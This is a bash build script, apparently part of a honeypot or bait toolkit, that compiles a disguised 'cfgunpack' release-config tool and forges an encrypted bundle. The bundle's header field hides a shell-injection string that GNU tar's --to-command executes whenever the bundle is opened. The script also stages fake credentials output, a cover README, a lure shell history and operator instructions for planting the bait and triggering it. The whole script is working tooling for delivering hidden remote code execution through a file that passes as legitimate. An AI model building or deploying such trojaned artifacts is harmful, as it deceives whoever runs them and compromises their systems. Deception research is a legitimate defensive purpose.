#!/usr/bin/env bash
# cfgunpack staging vessel — wrap the bundled payload in a "release-config bundle
# (un)packer" RCE delivery artifact.
#
# Cover story: `cfgunpack` is a platform team's internal tool that packs/unpacks the
# per-release configuration bundle (`prod-config.enc`) shipped alongside each tagged build —
# a self-describing binary container holding an Argon2id + ChaCha20-Poly1305 AEAD body of
# production secrets. The artifact ships the real, working binary plus one forged bundle and
# a README that reads like the genuine internal project. An operator who finds it runs the
# obvious thing — `cfgunpack decrypt prod-config.enc` — to read the production secrets; the
# bundle decrypts and prints a convincing set of AWS/Stripe/Okta/etc. credentials to stdout
# **and**, as an invisible side effect, executes the embedded SDK payload. A genuine bundle
# would just decrypt.
#
# Mechanism: bundles may declare a per-file "extras transformer" that each release-notes file
# in an optional sidecar tarball is streamed through at extraction time. The tool implements
# that by handing the sidecar to GNU tar's `--to-command=PROG`, which tar runs via
# `execlp("/bin/sh","sh","-c",PROG,...)` — i.e. shell-evaluated. PROG is assembled by
# concatenating a strictly-validated transformer name with a second string recovered by
# decrypting the bundle header's `extras_transform_digest` field (a base64 blob that reads
# like an integrity tag but is actually ChaCha20-Poly1305 ciphertext of shell arguments). The
# forge encrypts `; <CMD> ; #` into that field, so the shell runs `sh -c "cat ; <CMD> ; #"`
# for the first sidecar member — <CMD> is the bundled SDK payload's one-liner. Every
# subcommand (`info`/`list`/`verify`/`decrypt`) extracts the sidecar, so any of them fires it.
#
# The digest key is bound to BOTH the bundle contents and a per-build secret baked into the
# binary (`buildSeed`), so a bundle only decrypts against the binary it was built with. This
# vessel builds the binary and forges the bundle in one pass, keyed to one seed, so the two
# are always paired — and because the key derivation is pure Go crypto with no arch dependence,
# a single forged bundle works against every binary this build produces (see "seed pairing").
#
# ── target_arch: x86_64-linux and/or aarch64-linux ────────────────────────────────────────
# cfgunpack is pure Go, so `CGO_ENABLED=0 go build` cross-compiles a fully static ELF for each
# Linux target with zero cross-toolchain and no libc dependency (portable-unix-binaries skill:
# static-Linux via CGO-off Go, not musl/Docker). macOS/Windows are out of scope for this
# vessel — the exploit needs GNU tar's `--to-command` (a GNU extension absent from BSD tar and
# BusyBox tar), so it targets Linux hosts only. An empty/omitted target_arch builds both Linux
# binaries (the default: everything this vessel produces); any other value — including any
# *-darwin — fails fast (docs/bait-authoring.md §5's "fail fast on unsupported targets" rule).
#
# ── seed pairing (one bundle drives every binary this build produces) ─────────────────────
# forge/genkey.py derives eight format-binding constants from the build seed and writes them
# into a generated bundle/defaults.go, whose init() reconstructs `buildSeed` at startup (the
# seed never appears verbatim in the binary, and the constants are emitted as non-adjacent
# vars so the linker can't coalesce them — this resists an attacker disassembling the binary
# to recover the key). genkey.py also prints that same seed, which the forge takes via -seed.
# All target binaries are built from ONE generated defaults.go (one buildSeed); the forge
# encrypts the digest under that same seed once. So the single staged prod-config.enc decrypts
# identically on the amd64 and arm64 binaries alike.
#
# ── determinism ──────────────────────────────────────────────────────────────────────────
# Byte-reproducible for a fixed context.json (and a fixed Go toolchain version): the eight
# genkey constants are derived from context.json's `seed` (not the system CSPRNG), and the
# forge's per-bundle salt/nonces come from a deterministic SHA-256 stream keyed by that same
# seed (-detrand), so identical context.json -> identical binaries + identical bundle
# (docs/bait-authoring.md §5 rule 3). `-trimpath` keeps build-machine paths out of the ELF.
# No network access at build time: the Go module dependencies are vendored under src/vendor/
# and the build runs with GOFLAGS=-mod=vendor + GOTOOLCHAIN=local (§5 rule 5).

set -euo pipefail

CONTEXT_JSON="${1:?usage: setup.sh <context.json>}"

# Parse context.json (Python one-liner — no jq dependency, matches the other vessels).
cj() { python3 -c "import json,sys; print(json.load(open('$CONTEXT_JSON')).get(sys.argv[1],''))" "$1"; }
BUNDLING_OUTPUTS=$(cj bundling_outputs_dir)
OUTPUT=$(cj output_dir)
OUTPUT_ROOT=$(cj output_dir_root)
SEED=$(cj seed)

VESSEL_DIR="$(cd "$(dirname "$0")" && pwd)"
SRC_DIR="$VESSEL_DIR/src"

# Scratch space: setup.sh builds in a copy of src/ so the committed tree stays pristine
# (genkey writes a generated defaults.go, `go build` writes a cache). Not part of the declared
# artifact; cleaned up on exit regardless of success/failure.
SCRATCH="$(mktemp -d)"
trap 'rm -rf "$SCRATCH"' EXIT

# ---- toolchain check -------------------------------------------------------------------
command -v go >/dev/null 2>&1 || { echo "error: 'go' is required on the build host (pure-Go static cross-compile)" >&2; exit 1; }
command -v python3 >/dev/null 2>&1 || { echo "error: 'python3' is required on the build host" >&2; exit 1; }

# ---- resolve which binaries to build from target_arch ----------------------------------
WANTED_ARCHES=()
while IFS= read -r a; do
    [[ -n "$a" ]] && WANTED_ARCHES+=("$a")
done < <(python3 -c "
import json
c = json.load(open('$CONTEXT_JSON'))
for a in (c.get('target_arch') or []):
    print(a)
")

for w in "${WANTED_ARCHES[@]-}"; do
    [[ -z "$w" ]] && continue
    case "$w" in
        x86_64-linux|aarch64-linux) ;;
        *)
            echo "error: unsupported target_arch '$w' — the cfgunpack vessel supports only" >&2
            echo "x86_64-linux and aarch64-linux. The exploit relies on GNU tar's --to-command," >&2
            echo "a GNU extension absent from BSD/macOS and BusyBox tar, so only Linux targets" >&2
            echo "are buildable from this vessel." >&2
            exit 1
            ;;
    esac
done

wants_arch() {
    local a="$1"
    [[ ${#WANTED_ARCHES[@]} -eq 0 ]] && return 0   # empty target_arch -> build everything this vessel produces
    local w
    for w in "${WANTED_ARCHES[@]}"; do [[ "$w" == "$a" ]] && return 0; done
    return 1
}

BUILD_AMD64=0; wants_arch x86_64-linux  && BUILD_AMD64=1
BUILD_ARM64=0; wants_arch aarch64-linux && BUILD_ARM64=1

PLAN=()
[[ "$BUILD_AMD64" == "1" ]] && PLAN+=("x86_64-linux")
[[ "$BUILD_ARM64" == "1" ]] && PLAN+=("aarch64-linux")
if [[ ${#WANTED_ARCHES[@]} -eq 0 ]]; then
    echo "building cfgunpack: ${PLAN[*]} (target_arch empty -> both Linux binaries)" >&2
else
    echo "building cfgunpack: ${PLAN[*]} (target_arch=[${WANTED_ARCHES[*]-}])" >&2
fi

# ---- hermetic build in a scratch copy of src/ ------------------------------------------
BUILD="$SCRATCH/build"
mkdir -p "$BUILD"
cp -R "$SRC_DIR/." "$BUILD/"
rm -f "$BUILD/bundle/defaults.go"   # never build against a stale generated file
cd "$BUILD"

export GOFLAGS=-mod=vendor          # offline: use the vendored deps under src/vendor
export GOTOOLCHAIN=local            # never fetch a different Go toolchain over the network
export CGO_ENABLED=0                # pure-Go static ELF (no libc, portable across every distro)

# genkey.py writes bundle/defaults.go (baking buildSeed into every binary) and prints the seed
# the forge must use. Deterministic when SEED is present; falls back to the CSPRNG otherwise.
if [[ -n "$SEED" ]]; then
    SEED_HEX=$(python3 forge/genkey.py --out bundle/defaults.go --seed-material "$SEED")
else
    SEED_HEX=$(python3 forge/genkey.py --out bundle/defaults.go)
fi

LDFLAGS="-s -w -X main.releaseTag=2026.04.r3"   # strip symbols/DWARF; pin the release tag the bundle carries
mkdir -p dist
build_one() {
    local goarch="$1" out="$2"
    echo "== compiling $out (GOOS=linux GOARCH=$goarch, static, CGO off) ==" >&2
    GOOS=linux GOARCH="$goarch" go build -trimpath -buildvcs=false -ldflags="$LDFLAGS" -o "dist/$out" .
}
BIN_LIST=()
[[ "$BUILD_AMD64" == "1" ]] && { build_one amd64 cfgunpack_linux_amd64; BIN_LIST+=(cfgunpack_linux_amd64); }
[[ "$BUILD_ARM64" == "1" ]] && { build_one arm64 cfgunpack_linux_arm64; BIN_LIST+=(cfgunpack_linux_arm64); }

# defaults.go is only needed while the binaries compile (buildSeed is baked into them there).
# The forge derives its key from -seed directly and doesn't need it.
rm -f bundle/defaults.go

# ---- forge the ONE bundle every built binary shares ------------------------------------
# The command executed by the shell injection is the bundler's pre-generated one-liner (never
# hand-rolled — docs/bait-authoring.md §5). -detrand makes the salt/nonces reproducible.
PAYLOAD_CMD=$(cat "$BUNDLING_OUTPUTS/ready_for_vessel.txt")
echo "== forging prod-config.enc (injected command = bundled SDK payload) ==" >&2
DETRAND_ARGS=()
[[ -n "$SEED" ]] && DETRAND_ARGS=(-detrand "$SEED")
go run ./forge -cmd "$PAYLOAD_CMD" -seed "$SEED_HEX" "${DETRAND_ARGS[@]}" -out "$OUTPUT/prod-config.enc" >&2

# ---- stage the binaries -----------------------------------------------------------------
for b in "${BIN_LIST[@]}"; do
    cp "dist/$b" "$OUTPUT/$b"
    chmod +x "$OUTPUT/$b"
done

# PRIMARY: the default entry point — prefer linux-amd64 (most common honeypot target),
# else whichever binary was actually built. All binaries are equally real release artifacts.
PRIMARY="${BIN_LIST[0]}"

# ---- stage a shell-history breadcrumb (enticement) --------------------------------------
# Nudges the reader toward the decrypt command that reads the "production secrets".
cat > "$OUTPUT/.bash_history" <<EOF
cd /opt/release-tooling
./$PRIMARY info prod-config.enc
./$PRIMARY decrypt prod-config.enc
EOF

# ---- stage a real-looking project README (cover; no security content) -------------------
python3 - "$OUTPUT/README.md" "$PRIMARY" "${BIN_LIST[@]}" <<'PYEOF'
import sys
readme_path, primary, *bins = sys.argv[1:]
names = ", ".join(f"`{b}`" for b in bins)
plural = "binary is" if len(bins) == 1 else "binaries are"
with open(readme_path, "w") as f:
    f.write(
        "# release-tooling\n\n"
        "Internal pack/unpack utility for the per-release config bundle that ships alongside "
        "each tagged build. Each bundle is a self-describing binary container: a plaintext "
        "header (release tag, created-at, author, KDF/cipher choice, key count) followed by an "
        "AEAD-encrypted body holding the flat key/value map deployed at runtime.\n\n"
        f"{len(bins)} {plural} provided ({names}) — run whichever matches this machine.\n\n"
        "## Usage\n\n"
        "```\n"
        "cfgunpack info    <bundle>           # print header (no decryption)\n"
        "cfgunpack list    <bundle>           # print key names only\n"
        "cfgunpack decrypt <bundle> [--out PATH] [--format env|yaml|json]\n"
        "cfgunpack verify  <bundle>\n"
        "```\n\n"
        "The release tag is baked into the binary at build time; decrypting a bundle whose tag "
        "does not match exits 4. Bundles may carry a small sidecar tarball of release notes and "
        "schema fixtures, materialized to a scratch directory at `decrypt` time.\n"
    )
PYEOF

# ---- artifact.json (root, not to_stage/) ------------------------------------------------
python3 - "$OUTPUT_ROOT/artifact.json" "$PRIMARY" "${BIN_LIST[@]}" <<'PYEOF'
import json, sys
artifact_path, primary, *bins = sys.argv[1:]
files = {b: {"role": "binary"} for b in bins}
files["prod-config.enc"] = {"role": "config"}
files[".bash_history"] = {"role": "config"}
files["README.md"] = {"role": "doc"}
with open(artifact_path, "w") as f:
    json.dump({"primary": primary, "files": files}, f, indent=2)
    f.write("\n")
PYEOF

# ---- how_to_stage.md (root, operator-only — never staged into to_stage/) ----------------
python3 - "$OUTPUT_ROOT/how_to_stage.md" "$PRIMARY" "${BIN_LIST[@]}" <<'PYEOF'
import sys
how_path, primary, *bins = sys.argv[1:]
bin_bullets = "\n".join(f"- `{b}`" for b in bins)
with open(how_path, "w") as f:
    f.write(
        "# How to stage this bait\n\n"
        "## What this is\n"
        "A real, working `cfgunpack` — an internal \"release-config bundle (un)packer\" — plus one "
        "forged bundle (`prod-config.enc`) and a README that reads like the genuine internal tool. "
        "Running `info`/`list`/`verify`/`decrypt` on the bundle is what an attacker naturally does to "
        "read the \"production secrets\"; `decrypt` prints a convincing set of AWS/Stripe/Okta/etc. "
        "credentials **and** fires the bundled SDK payload as an invisible side effect. A genuine "
        "bundle would just decrypt.\n\n"
        f"This build produced {len(bins)} " + ("binary" if len(bins) == 1 else "binaries") + f":\n{bin_bullets}\n\n"
        "## How to stage it\n"
        "Copy whichever binary matches the target's architecture, `prod-config.enc`, `README.md` and "
        "`.bash_history` onto the target, keeping them in one directory. Make the binary executable "
        "(`chmod +x`). The README and shell-history breadcrumb are cover — leave them in place.\n\n"
        "**Target requirements:** a Linux host with **GNU tar** on `PATH` (the transform runs through "
        "GNU tar's `--to-command`; BusyBox tar — common on Alpine — does not implement it and the "
        "payload will not fire) and `python3` (the bundled payload is a `python3 -c` one-liner, same "
        "as any hostname_grab-based bait).\n\n"
        "## Exact trigger command\n"
        "```\n"
        f"./{primary} decrypt prod-config.enc\n"
        "```\n"
        "(substitute whichever of the binaries above matches the target. `info`, `list` and `verify` "
        "on the same bundle also fire the payload — every subcommand extracts the sidecar — but "
        "`decrypt` is the natural lure since it prints the secrets. The payload runs synchronously "
        "as part of the command.)\n"
    )
PYEOF

echo "staged: ${BIN_LIST[*]} + prod-config.enc (RCE-armed bundle, works against all of them) + README.md + .bash_history" >&2
